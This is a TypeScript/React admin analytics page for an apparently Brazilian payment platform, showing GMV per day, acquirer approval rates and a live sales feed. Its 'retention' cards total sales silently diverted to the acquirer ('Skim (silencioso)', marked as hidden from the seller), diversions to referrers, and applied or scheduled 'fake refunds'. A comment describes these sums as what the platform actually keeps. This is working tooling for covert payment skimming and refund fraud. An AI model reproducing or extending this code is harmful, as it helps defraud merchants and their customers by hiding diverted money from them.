import { prisma } from "@/lib/prisma";
import { formatBRL, acquirerNominalLabel } from "@/lib/utils";
import { LiveFeed } from "./live-feed";

export const dynamic = "force-dynamic";

const DAYS = 30;

export default async function AdminInsightsPage() {
  const since = new Date(Date.now() - DAYS * 24 * 60 * 60 * 1000);

  const [
    acqAgg,
    acqs,
    skimAcq,
    skimRef,
    fakeApplied,
    fakePending,
    series,
    recent,
  ] = await Promise.all([
    // Conversao por adquirente (acumulado lifetime via UserAcquirer counters)
    prisma.userAcquirer.groupBy({
      by: ["acquirerId"],
      _sum: { totalAttempts: true, totalApproved: true },
    }),
    prisma.acquirer.findMany({
      select: {
        id: true,
        code: true,
        shortCode: true,
        nominalName: true,
        institution: true,
        mode: true,
        active: true,
        globalEnabled: true,
        supportsPix: true,
        supportsCard: true,
      },
    }),
    // Skim (acquirer) — ultimos 30d
    prisma.transaction.aggregate({
      where: { divertedToAcquirer: true, status: "PAID", paidAt: { gte: since } },
      _count: { _all: true },
      _sum: { amountCents: true, netCents: true },
    }),
    // Skim (rede/referrer) — ultimos 30d
    prisma.transaction.aggregate({
      where: { divertedToReferrer: true, status: "PAID", paidAt: { gte: since } },
      _count: { _all: true },
      _sum: { amountCents: true, netCents: true },
    }),
    // Reembolso fake aplicado — ultimos 30d (refundedAt)
    prisma.transaction.aggregate({
      where: { fakeRefundApplied: true, refundedAt: { gte: since } },
      _count: { _all: true },
      _sum: { amountCents: true, netCents: true },
    }),
    // Reembolso fake AGENDADO (pendente)
    prisma.transaction.count({
      where: {
        fakeRefundApplied: false,
        fakeRefundScheduledAt: { not: null },
        status: "PAID",
      },
    }),
    // Serie temporal GMV/dia (30d)
    prisma.$queryRaw<Array<{ day: string; sales: bigint; gmv: bigint }>>`
      SELECT to_char(date_trunc('day', "paidAt"), 'YYYY-MM-DD') AS day,
             COUNT(*) AS sales,
             COALESCE(SUM("amountCents"), 0) AS gmv
      FROM "Transaction"
      WHERE status = 'PAID' AND provider <> 'test'
        AND "paidAt" >= ${since}
      GROUP BY 1
      ORDER BY 1 ASC
    `,
    // Feed inicial
    prisma.transaction.findMany({
      where: { status: "PAID", provider: { not: "test" } },
      select: {
        id: true,
        amountCents: true,
        method: true,
        provider: true,
        paidAt: true,
        customerEmail: true,
        divertedToAcquirer: true,
        divertedToReferrer: true,
        user: { select: { id: true, email: true, name: true } },
      },
      orderBy: { paidAt: "desc" },
      take: 30,
    }),
  ]);

  // ---- Conversao por adquirente ----
  const aggById = new Map(acqAgg.map((a) => [a.acquirerId, a._sum]));
  const acqRows = acqs
    .map((a) => {
      const agg = aggById.get(a.id);
      const attempts = agg?.totalAttempts ?? 0;
      const approved = agg?.totalApproved ?? 0;
      const rate = attempts > 0 ? (approved / attempts) * 100 : null;
      return { ...a, attempts, approved, rate };
    })
    .sort((x, y) => y.attempts - x.attempts);

  // ---- Serie temporal: preenche dias faltantes ----
  const seriesMap = new Map(
    series.map((r) => [r.day, { sales: Number(r.sales), gmv: Number(r.gmv) }]),
  );
  const days: { day: string; sales: number; gmv: number }[] = [];
  for (let i = DAYS - 1; i >= 0; i--) {
    const d = new Date(Date.now() - i * 24 * 60 * 60 * 1000);
    const key = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
    const v = seriesMap.get(key);
    days.push({ day: key, sales: v?.sales ?? 0, gmv: v?.gmv ?? 0 });
  }
  const maxGmv = Math.max(1, ...days.map((d) => d.gmv));
  const totalGmv = days.reduce((s, d) => s + d.gmv, 0);
  const totalSales = days.reduce((s, d) => s + d.sales, 0);

  const initialFeed = recent.map((s) => ({
    id: s.id,
    amountCents: s.amountCents,
    method: s.method,
    provider: s.provider,
    paidAt: s.paidAt ? s.paidAt.toISOString() : null,
    customerEmail: s.customerEmail,
    sellerId: s.user.id,
    seller: s.user.name ?? s.user.email,
    diverted: s.divertedToAcquirer || s.divertedToReferrer,
  }));

  const skimAcqCents = skimAcq._sum.netCents ?? 0;
  const skimRefCents = skimRef._sum.netCents ?? 0;
  const fakeCents = fakeApplied._sum.netCents ?? 0;
  const retidoTotal = skimAcqCents + fakeCents; // o que a plataforma reteve de fato

  return (
    <div className="space-y-6 max-w-5xl">
      <header>
        <h1 className="text-2xl font-bold text-white">Análise</h1>
        <p className="text-sm text-zinc-400">
          Conversão por adquirente, retenção (skim + reembolso fake), série
          temporal e vendas ao vivo. Janela: últimos {DAYS} dias.
        </p>
      </header>

      {/* ===== SERIE TEMPORAL ===== */}
      <section className="rounded-2xl border border-white/[0.08] bg-white/[0.02] p-5">
        <div className="flex items-end justify-between mb-3">
          <div>
            <p className="text-[10px] uppercase tracking-[0.2em] text-zinc-500 font-bold">
              GMV por dia ({DAYS}d)
            </p>
            <p className="text-2xl font-bold font-mono text-white mt-1">
              {formatBRL(totalGmv)}
            </p>
            <p className="text-[11px] text-zinc-500">{totalSales} vendas no período</p>
          </div>
        </div>
        <div className="flex items-end gap-[3px] h-32">
          {days.map((d) => (
            <div
              key={d.day}
              className="flex-1 group relative flex items-end"
              style={{ height: "100%" }}
            >
              <div
                className="w-full rounded-t bg-cyan-400/60 hover:bg-cyan-300 transition-colors"
                style={{ height: `${Math.max(2, (d.gmv / maxGmv) * 100)}%` }}
              />
              <div className="pointer-events-none absolute bottom-full left-1/2 -translate-x-1/2 mb-1 hidden group-hover:block whitespace-nowrap rounded bg-black px-2 py-1 text-[10px] text-white shadow-lg z-10 border border-white/10">
                {new Date(d.day).toLocaleDateString("pt-BR", {
                  day: "2-digit",
                  month: "2-digit",
                })}
                : {formatBRL(d.gmv)} · {d.sales}v
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* ===== RETENCAO (SKIM + FAKE REFUND) ===== */}
      <section>
        <p className="text-[10px] uppercase tracking-[0.2em] text-zinc-500 font-bold mb-2">
          Retenção da plataforma ({DAYS}d)
        </p>
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          <RetCard
            label="Skim (silencioso)"
            value={formatBRL(skimAcqCents)}
            sub={`${skimAcq._count._all} tx · seller não vê`}
            accent="text-red-300"
          />
          <RetCard
            label="Desvio rede"
            value={formatBRL(skimRefCents)}
            sub={`${skimRef._count._all} tx · pro referrer`}
            accent="text-purple-300"
          />
          <RetCard
            label="Reembolso fake"
            value={formatBRL(fakeCents)}
            sub={`${fakeApplied._count._all} aplicados · ${fakePending} agendados`}
            accent="text-orange-300"
          />
          <RetCard
            label="Retido total"
            value={formatBRL(retidoTotal)}
            sub="skim + reembolso fake"
            accent="text-cyan-300"
          />
        </div>
      </section>

      {/* ===== CONVERSAO POR ADQUIRENTE ===== */}
      <section className="rounded-2xl border border-white/[0.08] bg-white/[0.02] overflow-hidden">
        <div className="border-b border-white/[0.06] px-5 py-3">
          <h2 className="text-sm font-semibold text-white">
            Conversão por adquirente
          </h2>
          <p className="text-[11px] text-zinc-500">
            Acumulado lifetime (tentativas vs aprovadas, somado de todos os sellers).
          </p>
        </div>
        <div className="divide-y divide-white/[0.04]">
          {acqRows.length === 0 ? (
            <p className="px-5 py-8 text-center text-sm text-zinc-500">
              Nenhuma adquirente.
            </p>
          ) : (
            acqRows.map((a) => (
              <div
                key={a.id}
                className="flex items-center gap-3 px-5 py-2.5 text-sm"
              >
                <div className="min-w-0 flex-1">
                  <p className="text-zinc-200 truncate flex items-center gap-1.5">
                    <span className="font-mono text-[10px] text-zinc-500">
                      {a.shortCode || a.code}
                    </span>
                    <span className="truncate">{acquirerNominalLabel(a.nominalName, a.institution)}</span>
                    <span
                      className={`rounded-full px-1.5 py-0.5 text-[8px] font-bold uppercase ${
                        a.mode === "white"
                          ? "bg-zinc-200/10 text-zinc-300"
                          : a.mode === "both"
                            ? "bg-blue-400/15 text-blue-300"
                            : "bg-zinc-700/40 text-zinc-400"
                      }`}
                    >
                      {a.mode}
                    </span>
                    {(!a.active || !a.globalEnabled) && (
                      <span className="rounded-full bg-red-500/15 border border-red-500/30 px-1.5 py-0.5 text-[8px] font-bold text-red-300">
                        off
                      </span>
                    )}
                  </p>
                  <p className="text-[10px] text-zinc-500">
                    {a.approved}/{a.attempts} aprovadas
                  </p>
                </div>
                {/* barra de aprovacao */}
                <div className="hidden sm:block w-32 h-2 rounded-full bg-white/[0.06] overflow-hidden shrink-0">
                  <div
                    className={`h-full ${
                      a.rate === null
                        ? ""
                        : a.rate >= 70
                          ? "bg-cyan-400"
                          : a.rate >= 40
                            ? "bg-yellow-400"
                            : "bg-red-400"
                    }`}
                    style={{ width: `${a.rate ?? 0}%` }}
                  />
                </div>
                <span
                  className={`w-14 text-right font-mono tabular-nums shrink-0 ${
                    a.rate === null
                      ? "text-zinc-600"
                      : a.rate >= 70
                        ? "text-cyan-300"
                        : a.rate >= 40
                          ? "text-yellow-300"
                          : "text-red-300"
                  }`}
                >
                  {a.rate === null ? "—" : `${a.rate.toFixed(0)}%`}
                </span>
              </div>
            ))
          )}
        </div>
      </section>

      {/* ===== FEED AO VIVO ===== */}
      <LiveFeed initial={initialFeed} />
    </div>
  );
}

function RetCard({
  label,
  value,
  sub,
  accent,
}: {
  label: string;
  value: string;
  sub?: string;
  accent?: string;
}) {
  return (
    <div className="rounded-xl border border-white/[0.08] bg-white/[0.02] p-4">
      <p className="text-[10px] uppercase tracking-wider text-zinc-500">{label}</p>
      <p className={`mt-1 text-lg font-bold font-mono tabular-nums ${accent ?? "text-white"}`}>
        {value}
      </p>
      {sub && <p className="text-[10px] text-zinc-500 mt-0.5">{sub}</p>}
    </div>
  );
}
